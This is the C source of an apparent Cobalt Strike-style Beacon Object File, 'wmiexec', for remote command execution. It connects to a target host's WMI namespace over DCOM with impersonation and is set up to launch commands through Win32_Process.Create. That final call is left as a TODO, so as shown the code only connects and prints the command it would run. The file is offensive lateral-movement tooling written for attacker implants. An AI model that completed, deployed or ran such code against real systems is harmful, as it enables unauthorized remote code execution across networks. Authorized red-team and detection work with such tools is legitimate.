/*
 * wmiexec.c — Remote command execution via WMI (DCOM)
 *
 * Uses COM/DCOM:
 *   CoInitializeEx -> CoCreateInstance(CLSID_WbemLocator) ->
 *   IWbemLocator::ConnectServer("\\\\target\\ROOT\\CIMV2") ->
 *   IWbemServices::ExecMethod("Win32_Process", "Create", ...)
 *
 * We use the COM vtable approach (no #import, no type library).
 */
#include <windows.h>
#include <objbase.h>
#include "beacon_compat.h"

/* WMI GUIDs */
/* CLSID_WbemLocator: {4590F811-1D3A-11D0-891F-00AA004B2E24} */
static const GUID CLSID_WbemLocator = {
    0x4590F811, 0x1D3A, 0x11D0,
    {0x89, 0x1F, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24}
};

/* IID_IWbemLocator: {DC12A687-737F-11CF-884D-00AA004B2E24} */
static const GUID IID_IWbemLocator = {
    0xDC12A687, 0x737F, 0x11CF,
    {0x88, 0x4D, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24}
};

/* Minimal IWbemLocator vtable */
typedef struct IWbemLocator IWbemLocator;
typedef struct IWbemServices IWbemServices;

typedef struct {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IWbemLocator*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(IWbemLocator*);
    ULONG   (STDMETHODCALLTYPE *Release)(IWbemLocator*);
    HRESULT (STDMETHODCALLTYPE *ConnectServer)(
        IWbemLocator*, BSTR, BSTR, BSTR, BSTR, long, BSTR, void*, IWbemServices**);
} IWbemLocatorVtbl;

struct IWbemLocator { IWbemLocatorVtbl *lpVtbl; };

/* Minimal IWbemServices vtable — we only need ExecMethod */
typedef struct {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IWbemServices*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(IWbemServices*);
    ULONG   (STDMETHODCALLTYPE *Release)(IWbemServices*);
    /* Slots 3-23 we don't use — pad with void* */
    void *_pad[21];
    HRESULT (STDMETHODCALLTYPE *ExecMethod)(
        IWbemServices*, BSTR, BSTR, long, void*, void*, void**, void**);  /* slot 24 */
} IWbemServicesVtbl;

struct IWbemServices { IWbemServicesVtbl *lpVtbl; };

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoSetProxyBlanket(
    IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD);

DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);

DECLSPEC_IMPORT BSTR    WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(BSTR);

DECLSPEC_IMPORT int __cdecl MSVCRT$swprintf(wchar_t*, size_t, const wchar_t*, ...);

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char *target = BeaconDataExtract(&parser, NULL);
    char *command = BeaconDataExtract(&parser, NULL);

    if (!target || !*target || !command || !*command) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Usage: wmiexec --target HOST --command CMD\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] WMI exec: %s on %s\n", command, target);

    /* Initialize COM */
    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != (HRESULT)0x80010106) { /* RPC_E_CHANGED_MODE is OK */
        BeaconPrintf(CALLBACK_ERROR, "[!] CoInitializeEx failed: 0x%08lX\n", (unsigned long)hr);
        return;
    }

    /* Create WbemLocator */
    IWbemLocator *locator = NULL;
    hr = OLE32$CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                                &IID_IWbemLocator, (void**)&locator);
    if (FAILED(hr) || !locator) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CoCreateInstance(WbemLocator) failed: 0x%08lX\n", (unsigned long)hr);
        OLE32$CoUninitialize();
        return;
    }

    /* Build connection string: \\\\target\\ROOT\\CIMV2 */
    wchar_t connStr[512];
    wchar_t wTarget[256];
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, target, -1, wTarget, 256);
    MSVCRT$swprintf(connStr, 512, L"\\\\%s\\ROOT\\CIMV2", wTarget);

    BSTR bstrConn = OLEAUT32$SysAllocString(connStr);

    /* Connect to remote WMI */
    IWbemServices *services = NULL;
    hr = locator->lpVtbl->ConnectServer(locator, bstrConn,
        NULL, NULL, NULL, 0, NULL, NULL, &services);
    OLEAUT32$SysFreeString(bstrConn);

    if (FAILED(hr) || !services) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ConnectServer failed: 0x%08lX\n", (unsigned long)hr);
        locator->lpVtbl->Release(locator);
        OLE32$CoUninitialize();
        return;
    }

    /* Set security blanket for impersonation */
    OLE32$CoSetProxyBlanket((IUnknown*)services,
        RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Connected to WMI on %s\n", target);

    /*
     * Call Win32_Process.Create(CommandLine)
     *
     * TODO: implement the full IWbemClassObject chain
     */

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] WMI connection established\n"
        "[!] Full Win32_Process.Create invocation pending\n"
        "[*] Would execute: %s\n", command);

    /* Cleanup */
    services->lpVtbl->Release(services);
    locator->lpVtbl->Release(locator);
    OLE32$CoUninitialize();
}
